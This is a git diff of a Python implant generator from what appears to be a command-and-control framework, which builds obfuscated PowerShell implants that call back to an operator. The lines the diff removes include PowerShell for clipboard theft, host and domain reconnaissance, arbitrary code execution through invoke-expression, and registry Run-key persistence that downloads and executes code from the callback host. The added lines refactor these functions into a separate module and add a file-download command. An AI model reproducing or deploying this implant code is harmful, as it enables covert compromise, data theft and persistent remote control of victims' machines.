@@ -3,7 +3,7 @@ import string
 import random
 
 from Implant.PSObfucate import PSObfucate
-
+from Implant.ImplantFunctionality import ImplantFunctionality
 
 class ImplantGenerator:
     # ImplantGenerator has a single public method (generate_implant_from_template)
@@ -11,8 +11,9 @@ class ImplantGenerator:
     #   calling back. Configuration from the implant template is used to determine
     #   which functionality should be embedded within the active implant.
 
+    ImpFunc = ImplantFunctionality()
+
     JinjaRandomisedArgs = {
-        "rnd_function": "aaaaaa",
         "obf_remote_play_audio": "RemotePlayAudio",
         "obf_sleep": "sleep",
         "obf_select_protocol": "select_protocol",
@@ -33,86 +34,6 @@ class ImplantGenerator:
         "obf_download_file": "download-file"
         }
 
-    # -- This is to be finished with PoC WorkWork audio
-    play_audio = '''
-function {{ ron.obf_remote_play_audio }}($data) {
-    $args[0]
-}
-'''
-    # This is an early iteration for testing - this will be
-    #   expanded to support image/audio/file list export.
-    fde_func_a = '''
-function {{ ron.obf_get_clipboard }}() {
-    $b = "Text"
-    $a = Get-Clipboard -Format $b
-    if ($a -ne $null ){$Script:tr = $a}
-    else {$Script:tr = "No clipboard data."}
-}
-'''
-
-    fde_func_b = '''
-function {{ ron.obf_collect_sysinfo }}(){
-    $h = hostname
-    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup
-    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address
-    $final_str = "Username: "+$env:UserName+"`nHostname: "+$h+"`nDomain: "+$d+"`nLocal IP: "+$a
-    $Script:tr = $final_str
-}
-'''
-
-    random_function = '''
-function {{ ron.rnd_function }} () {}
-'''
-
-    load_module = '''
-function {{ ron.obf_load_module }} ($data) {
-    $b = $data
-    $data = $b -split '::', 2
-    $name = $data[0].Replace(" ","")
-    $bgt = $data[1]
-    $b = [ScriptBlock]::Create($bgt)
-    New-Module -ScriptBlock $b -Name $name -Verbose | Import-Module
-    $Script:tr = Get-Command -Module $name -Verbose
-}
-'''
-
-    invoke_commands = '''
-function {{ ron.obf_invoke_module }} ($data) {
-    $Script:tr = invoke-expression "$data"
-}
-'''
-# Requires updating.
-    get_loaded_modules = '''
-function {{ ron.obf_get_loaded_modules }} () {
-    $Script:tr = Get-Command | Where {$_.Source -Like "FC2"}
-}
-'''
-
-    upload_file = '''
-# Uploading files to client - Not yet implemented
-function {{ ron.obf_upload_file }} () {}
-'''
-
-    download_file = '''
-# Download files from client - Not yet implemented
-function {{ ron.obf_download_file }} () {}
-
-'''
-
-    # -- This needs improvement, it only supports http persistence.
-    create_persistence = '''
-function {{ ron.obf_create_persistence }}(){
-    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
-    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
-    $val = "powershell.exe -c (iex ((New-Object Net.WebClient).DownloadString('http://${{ ron.obf_callback_url }}:{{ http_port }}/robots.txt?user={{ stager_key }}')))"
-    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
-        $a = 0; 
-    } else {
-        New-ItemProperty -Path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
-    }
-    $Script:tr = "Enabled"
-}
-'''
 
     execute_command = '''
 function {{ ron.obf_builtin_command }}($data){
@@ -140,6 +61,8 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_invoke_module }}($b)
     } elseif ($a -eq "ML"){
         {{ ron.obf_get_loaded_modules }}  
+    } elseif ($a -eq "FD"){
+        {{ ron.obf_download_file }}($b)
     } else {
         $Script:tr = "0"
     }
@@ -242,23 +165,15 @@ while($true){
         return function_names
 
     def _process_modules(self, implant_data, randomised_function_names):
-        # --  New in Dwarven Blacksmith
         # Add default functions to added to the implant which will be randomised.
-        implant_functions = [
-            self.play_audio,
-            self.random_function,
+        core_implant_functions = [
             self.execute_command,
-            self.fde_func_a,
-            self.fde_func_b,
-            self.create_persistence,
-            self.select_protocol,
-            self.load_module,
-            self.invoke_commands,
-            self.get_loaded_modules
+            self.select_protocol
             ]
-    # The following functions need to be added once they have been finalised.
-    # self.upload_file
-    # self.download_file
+
+        implant_functions = self.ImpFunc.get_list_of_implant_text()
+        implant_functions.extend(core_implant_functions)
+
 
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
@@ -289,8 +204,15 @@ while($true){
         return constructed_implant, f_str
 
     def generate_implant_from_template(self, implant_data):
-        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
+        """
+        generate_implant_from_template
+         - Takes the generated implant info (Generated implants (by UIK)
 
+        _process_modules
+         - This controls which protocols and additional modules are embedded into the implant.
+         - Generates the main function multi proto selection
+        """
+        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
         implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)
 
         callback_url = implant_data['callback_url']
@@ -316,14 +238,3 @@ while($true){
             obf_variables=variable_list
         )
         return output_from_parsed_template
-
-
-blah = '''
-render_implant (Public)
- - Takes the generated implant info (Generated implants (by UIK)
- 
-process_modules 
- - This controls which protocols and additional modules are embedded into the implant.
- - Generates the main function multi proto selection
-
-'''
